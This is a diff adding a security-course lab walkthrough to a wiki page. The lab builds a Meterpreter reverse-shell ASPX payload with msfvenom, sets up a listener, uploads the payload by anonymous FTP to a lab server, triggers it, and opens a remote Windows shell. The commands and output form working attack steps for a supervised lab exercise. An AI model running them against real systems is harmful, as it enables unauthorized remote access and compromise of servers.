@@ -21,6 +21,72 @@ Creation-Date: 2020-01-30T23:44:12-08:00
 	* https://www.offensive-security.com/metasploit-unleashed/msfvenom/
 	* https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
 
+==== Network Diagram ====
+{{file:///media/avendanl/MintData/Documents2/CSIS88-SecurityPractices-SP20/Week3/diagrams/Lab3-RAT.png}}
+
 ==== TODO ====
-	UNDER CONSTRUCTION ------- UNDERCONSTRUCTION ------- UNDER CONSTRUCTION
+
+	1. Let's create a Reverse Shell RAT using the MetaSploit Framework. From the same Terminal you've been working in, execute the following commands: Note: Substitute X with your Host IP in LHOST.
+	
+{{{code: lang="sh" linenumbers="True"
+root@kali:# msfvenom -p windows/x64/meterpreter/reverse_tcp \
+LHOST=172.16.1.X LPORT=4444 -f aspx > <suid>.aspx
+}}}
+	
+
+	2. Start a Meterpreter Session in Kali.
+{{{code: lang="sh" linenumbers="True"
+root@kali:# /etc/init.d/postgresql start
+root@kali:# msfconsole
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > show options
+msf5 exploit(multi/handler) > set LHOST <your_vm_ip>
+msf5 exploit(multi/handler) > set LPORT 4444
+msf5 exploit(multi/handler) > run
+
+[-] Handler started bind to 172.16.170.142:4444:-  -
+[*] Started reverse TCP handler on 172.16.170.142:4444 
+}}}
+	
+
+	3. FTP our RAT to the vulnerable system.
+{{{code: lang="sh" linenumbers="True"
+root@kali:# ftp 172.16.1.29Name (172.16.1.29:root): anonymous
+331 Password required for anonymous
+Password:
+230 Logged on
+Remote system type is UNIX.
+
+User: anonymous
+Pass: <no_pass>
+
+ftp> put <suid>.aspx
+ftp> quit
+}}}
+	
+
+	4. Execute your RAT by visiting http://172.16.1.29/<suid>.aspx
+	5. You should see a Reverse Connection back to your Meterpreter handler.
+	6. Type help to see all available commands.
+{{{code: lang="sh" linenumbers="True"
+meterpreter > help
+
+meterpreter > shell
+Process 4904 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+}}}
+	
+
+	7. After you migrate to a "shell" navigate to the Public user's home directory and leave your mark.
+{{{code: lang="sh" linenumbers="True"
+>cd c:\Users\Public 
+C:\Users\Public> echo "<hacker_handle> was here!" > <suid>.txt
+}}}
+	
+
+	8. Have the instructor verify that you've successfully compromised the Server. And you're done!!
+
 
